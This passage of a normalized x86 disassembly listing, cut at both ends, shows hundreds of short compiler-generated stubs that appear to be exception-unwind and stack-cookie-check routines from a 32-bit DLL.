jmp sub_10035d10
sub_1007fad1
mov ecx [ ebp + 0x8 ]
add ecx 0x5c
jmp sub_10035d10
sub_1007fadc
mov ecx [ ebp + 0x8 ]
add ecx 0x78
jmp sub_10035d10
sub_1007fae7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fb10
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_1007fb18
lea ecx [ ebp - 0x48 ]
jmp sub_10021250
sub_1007fb20
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fb50
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_1007fb58
lea ecx [ ebp - 0x64 ]
jmp sub_10021250
sub_1007fb60
lea ecx [ ebp - 0x48 ]
jmp sub_10021250
sub_1007fb68
lea ecx [ ebp - 0x80 ]
jmp sub_10021250
sub_1007fb70
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fba0
lea ecx [ ebp + 0x10 ]
jmp sub_10021250
sub_1007fba8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fbd0
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_10021250
sub_1007fbe9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fc10
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_1007fc18
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fc40
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_10021250
sub_1007fc59
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fc80
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fca0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_1001f980
add esp 0x8
retn
sub_1007fcb1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fcd0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fd00
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fd20
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
call sub_1001f980
add esp 0x8
retn
sub_1007fd31
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_1001f980
add esp 0x8
retn
sub_1007fd42
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fd60
mov ecx [ ebp - 0x10 ]
jmp sub_10021770
sub_1007fd68
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_10039fd0
sub_1007fd73
mov esi [ ebp - 0x10 ]
add esi 0xa0
jmp sub_100456b0
sub_1007fd81
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fda0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fdc0
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
call sub_1001f980
add esp 0x8
retn
sub_1007fdd1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fdf0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_1001f980
add esp 0x8
retn
sub_1007fe01
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fe20
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fe40
lea ecx [ ebp - 0x18 ]
jmp sub_1002470e
sub_1007fe48
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fe70
lea ecx [ ebp - 0x10 ]
jmp sub_1002a730
sub_1007fe78
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fea0
mov ecx [ ebp + 0x8 ]
add ecx 0x20
jmp sub_10021250
sub_1007feab
mov esi [ ebp + 0x8 ]
add esi 0x3a0
jmp sub_100456b0
sub_1007feb9
mov esi [ ebp + 0x8 ]
add esi 0x3b0
jmp sub_1002e400
sub_1007fec7
mov esi [ ebp + 0x8 ]
add esi 0x3c0
jmp sub_100456b0
sub_1007fed5
mov ecx [ ebp - 0x18 ]
add ecx 0x4
jmp sub_10035d10
sub_1007fee0
mov ecx [ ebp - 0x24 ]
sub ecx 0x48
jmp sub_1000a4d0
sub_1007feeb
mov ecx [ ebp - 0x28 ]
add ecx 0x4
jmp sub_10061091
sub_1007fef6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007ff20
mov ecx [ ebp - 0x6c ]
jmp sub_10035d10
sub_1007ff28
mov ecx [ ebp - 0x6c ]
add ecx 0x1c
jmp sub_10035d10
sub_1007ff33
lea ecx [ ebp - 0x68 ]
jmp sub_10035d10
sub_1007ff3b
lea ecx [ ebp - 0x68 ]
jmp sub_10035d10
sub_1007ff43
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007ff70
mov ecx [ ebp + 0x8 ]
jmp sub_10035d10
sub_1007ff78
mov ecx [ ebp + 0x8 ]
add ecx 0x24
jmp sub_10035d10
sub_1007ff83
mov ecx [ ebp + 0x8 ]
add ecx 0x40
jmp sub_10035d10
sub_1007ff8e
mov ecx [ ebp + 0x8 ]
add ecx 0x5c
jmp sub_10035d10
sub_1007ff99
mov ecx [ ebp + 0x8 ]
add ecx 0x78
jmp sub_10035d10
sub_1007ffa4
mov ecx [ ebp + 0x8 ]
add ecx 0x94
jmp sub_10035d10
sub_1007ffb2
mov ecx [ ebp + 0x8 ]
add ecx 0xb0
jmp sub_10035d10
sub_1007ffc0
mov ecx [ ebp + 0x8 ]
add ecx 0xcc
jmp sub_10035d10
sub_1007ffce
mov ecx [ ebp + 0x8 ]
add ecx 0xe8
jmp sub_10035d10
sub_1007ffdc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10080000
lea ecx [ ebp - 0xb8 ]
jmp sub_10035d10
sub_1008000b
lea ecx [ ebp - 0x144 ]
jmp sub_10055f90
sub_10080016
lea ecx [ ebp - 0x154 ]
jmp sub_10055f90
sub_10080021
lea ecx [ ebp - 0x164 ]
jmp sub_10055f90
sub_1008002c
lea ecx [ ebp - 0x17c ]
jmp sub_10055f90
sub_10080037
lea edi [ ebp - 0xc4 ]
jmp sub_10005b80
sub_10080042
lea edi [ ebp - 0xc4 ]
jmp sub_10005b80
sub_1008004d
lea edi [ ebp - 0xc4 ]
jmp sub_10005b80
sub_10080058
lea edi [ ebp - 0xc4 ]
jmp sub_10005b80
sub_10080063
lea edi [ ebp - 0xc4 ]
jmp sub_10005b80
sub_1008006e
lea edi [ ebp - 0xc4 ]
jmp sub_10005b80
sub_10080079
lea edi [ ebp - 0xc4 ]
jmp sub_10005b80
sub_10080084
lea edi [ ebp - 0xd4 ]
jmp sub_10005b80
sub_1008008f
lea ecx [ ebp - 0x164 ]
jmp sub_10055f90
sub_1008009a
lea ecx [ ebp - 0x154 ]
jmp sub_10055f90
sub_100800a5
lea ecx [ ebp - 0x144 ]
jmp sub_10055f90
sub_100800b0
lea edi [ ebp - 0xd4 ]
jmp sub_10005b80
sub_100800bb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x180 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100800f0
mov eax [ ebp - 0x10 ]
push eax
call sub_10065045
pop ecx
retn
sub_100800fb
mov eax [ ebp - 0x10 ]
push eax
call sub_10065045
pop ecx
retn
sub_10080106
mov eax [ ebp - 0x10 ]
push eax
call sub_10065045
pop ecx
retn
sub_10080111
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10080130
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_1001f980
add esp 0x8
retn
sub_10080141
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10080160
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10080190
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_10021250
sub_100801a9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100801d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100801f0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_1001f980
add esp 0x8
retn
sub_10080201
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_1001f980
add esp 0x8
retn
sub_10080212
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10080230
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_1008023b
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080246
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080251
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_1008025c
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080267
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080272
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_1008027d
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080288
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080293
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_1008029e
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100802a9
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100802b4
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100802bf
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100802ca
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100802d5
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100802e0
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100802eb
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100802f6
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080301
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_1008030c
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080317
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080322
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_1008032d
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080338
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080343
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_1008034e
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080359
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080364
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_1008036f
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_1008037a
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080385
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080390
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_1008039b
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100803a6
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100803b1
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100803bc
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100803c7
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100803d2
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100803dd
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100803e8
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100803f3
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_100803fe
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080409
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080414
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_1008041f
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_1008042a
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080435
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_10080440
lea ecx [ ebp - 0x154 ]
jmp sub_10021250
sub_1008044b
lea ecx [ ebp - 0x170 ]
jmp sub_10021250
sub_10080456
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1ac ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10080480
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_10021250
sub_10080499
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100804c0
mov eax [ ebp - 0x38 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x38 ] 0xfffffffe
mov ecx [ ebp - 0x3c ]
jmp sub_1005e370
sub_100804d9
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_100804e1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10080510
lea ecx [ ebp - 0xbc ]
jmp sub_10021250
sub_1008051b
lea ecx [ ebp - 0x84 ]
jmp sub_10021250
sub_10080526
lea ecx [ ebp - 0x180 ]
jmp sub_10021250
sub_10080531
lea ecx [ ebp - 0x190 ]
jmp sub_1005e370
sub_1008053c
lea ecx [ ebp - 0xd8 ]
jmp sub_10021250
sub_10080547
lea ecx [ ebp - 0x12c ]
jmp sub_10021250
sub_10080552
lea ecx [ ebp - 0x110 ]
jmp sub_10021250
sub_1008055d
lea ecx [ ebp - 0xa0 ]
jmp sub_10021250
sub_10080568
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_10080570
lea ecx [ ebp - 0x148 ]
jmp sub_10021250
sub_1008057b
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_10080583
lea ecx [ ebp - 0x164 ]
jmp sub_10021250
sub_1008058e
lea ecx [ ebp - 0xf4 ]
jmp sub_10021250
sub_10080599
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_100805a1
lea ecx [ ebp - 0x68 ]
jmp sub_10021250
sub_100805a9
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_100805b1
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_100805b9
lea ecx [ ebp - 0x68 ]
jmp sub_10021250
sub_100805c1
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_100805c9
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_100805d1
lea ecx [ ebp - 0x68 ]
jmp sub_10021250
sub_100805d9
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_100805e1
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_100805e9
lea ecx [ ebp - 0x68 ]
jmp sub_10021250
sub_100805f1
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_100805f9
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_10080601
lea ecx [ ebp - 0x68 ]
jmp sub_10021250
sub_10080609
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_10080611
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_10080619
lea ecx [ ebp - 0x68 ]
jmp sub_10021250
sub_10080621
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_10080629
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_10080631
lea ecx [ ebp - 0x68 ]
jmp sub_10021250
sub_10080639
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_10080641
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_10080649
lea ecx [ ebp - 0x68 ]
jmp sub_10021250
sub_10080651
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c8 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10080680
lea esi [ ebp - 0x114 ]
jmp sub_1002efc0
sub_1008068b
lea ecx [ ebp - 0x130 ]
jmp sub_10021250
sub_10080696
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x140 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100806c0
lea ecx [ ebp - 0x120 ]
jmp sub_1005e370
sub_100806cb
lea ecx [ ebp - 0x84 ]
jmp sub_10021250
sub_100806d6
lea ecx [ ebp - 0xbc ]
jmp sub_10021250
sub_100806e1
lea ecx [ ebp - 0xd8 ]
jmp sub_10021250
sub_100806ec
lea ecx [ ebp - 0x110 ]
jmp sub_10021250
sub_100806f7
lea ecx [ ebp - 0xa0 ]
jmp sub_10021250
sub_10080702
lea ecx [ ebp - 0x68 ]
jmp sub_10021250
sub_1008070a
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_10080712
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_1008071a
lea ecx [ ebp - 0x68 ]
jmp sub_10021250
sub_10080722
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_1008072a
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_10080732
lea ecx [ ebp - 0x68 ]
jmp sub_10021250
sub_1008073a
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_10080742
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_1008074a
lea ecx [ ebp - 0x68 ]
jmp sub_10021250
sub_10080752
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_1008075a
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_10080762
lea ecx [ ebp - 0xf4 ]
jmp sub_10021250
sub_1008076d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x138 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100807a0
lea ecx [ ebp - 0x164 ]
jmp sub_10021250
sub_100807ab
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_100807b3
lea ecx [ ebp - 0x68 ]
jmp sub_10021250
sub_100807bb
lea ecx [ ebp - 0xbc ]
jmp sub_10021250
sub_100807c6
lea ecx [ ebp - 0x174 ]
jmp sub_1005e370
sub_100807d1
lea ecx [ ebp - 0xd8 ]
jmp sub_10021250
sub_100807dc
lea ecx [ ebp - 0x110 ]
jmp sub_10021250
sub_100807e7
lea ecx [ ebp - 0x68 ]
jmp sub_10021250
sub_100807ef
lea ecx [ ebp - 0xf4 ]
jmp sub_10021250
sub_100807fa
lea ecx [ ebp - 0xa0 ]
jmp sub_10021250
sub_10080805
lea ecx [ ebp - 0x68 ]
jmp sub_10021250
sub_1008080d
lea ecx [ ebp - 0x12c ]
jmp sub_10021250
sub_10080818
lea ecx [ ebp - 0x84 ]
jmp sub_10021250
sub_10080823
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_1008082b
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_10080833
lea ecx [ ebp - 0x84 ]
jmp sub_10021250
sub_1008083e
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_10080846
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_1008084e
lea ecx [ ebp - 0x84 ]
jmp sub_10021250
sub_10080859
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_10080861
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_10080869
lea ecx [ ebp - 0x84 ]
jmp sub_10021250
sub_10080874
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_1008087c
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_10080884
lea ecx [ ebp - 0x84 ]
jmp sub_10021250
sub_1008088f
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_10080897
lea ecx [ ebp - 0x4c ]
jmp sub_10021250
sub_1008089f
lea ecx [ ebp - 0x148 ]
jmp sub_10021250
sub_100808aa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x190 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100808e0
lea ecx [ ebp - 0x100 ]
jmp sub_1005e370
sub_100808eb
lea ecx [ ebp - 0x64 ]
jmp sub_10021250
sub_100808f3
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_100808fb
lea ecx [ ebp - 0xd4 ]
jmp sub_10021250
sub_10080906
lea ecx [ ebp - 0xf0 ]
jmp sub_10021250
sub_10080911
lea ecx [ ebp - 0xb8 ]
jmp sub_10021250
sub_1008091c
lea ecx [ ebp - 0x9c ]
jmp sub_10021250
sub_10080927
lea ecx [ ebp - 0x48 ]
jmp sub_10021250
sub_1008092f
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_10080937
lea ecx [ ebp - 0x9c ]
jmp sub_10021250
sub_10080942
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_1008094a
lea ecx [ ebp - 0x48 ]
jmp sub_10021250
sub_10080952
lea ecx [ ebp - 0x9c ]
jmp sub_10021250
sub_1008095d
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_10080965
lea ecx [ ebp - 0x48 ]
jmp sub_10021250
sub_1008096d
lea ecx [ ebp - 0x80 ]
jmp sub_10021250
sub_10080975
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x124 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100809a0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_1001f980
add esp 0x8
retn
sub_100809b1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100809d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100809f0
mov esi [ ebp - 0x10 ]
add esi 0x4
jmp sub_100456b0
sub_100809fb
mov esi [ ebp - 0x10 ]
add esi 0x18
jmp sub_1002e400
sub_10080a06
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10080a30
mov esi [ ebp - 0x10 ]
jmp sub_1000e930
sub_10080a38
mov ecx [ ebp - 0x10 ]
add ecx 0x94
jmp sub_10035d10
sub_10080a46
mov esi [ ebp - 0x10 ]
add esi 0xb4
jmp sub_1002b960
sub_10080a54
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10080a70
mov esi [ ebp + 0x8 ]
jmp sub_1000e930
sub_10080a78
mov ecx [ ebp + 0x8 ]
add ecx 0x94
jmp sub_10035d10
sub_10080a86
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10080ab0
lea ecx [ ebp - 0x2c ]
jmp sub_10035d10
sub_10080ab8
lea ecx [ ebp - 0x48 ]
jmp sub_10035d10
sub_10080ac0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10080af0
mov eax [ ebp - 0x78 ]
jmp sub_1005fd00
sub_10080af8
lea eax [ ebp - 0x7c ]
jmp sub_100260d0
sub_10080b00
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10080b30
lea ecx [ ebp - 0x2c ]
jmp sub_10035d10
sub_10080b38
lea ecx [ ebp - 0x2c ]
jmp sub_10035d10
sub_10080b40
lea ecx [ ebp - 0x2c ]
jmp sub_10035d10
sub_10080b48
lea ecx [ ebp - 0x48 ]
jmp sub_10035d10
sub_10080b50
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10080b80
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10080ba0
lea ecx [ ebp - 0x44 ]
jmp sub_10035d10
sub_10080ba8
mov ecx [ ebp - 0x4c ]
add ecx 0x4
jmp sub_10035d10
sub_10080bb3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_1004c3b6
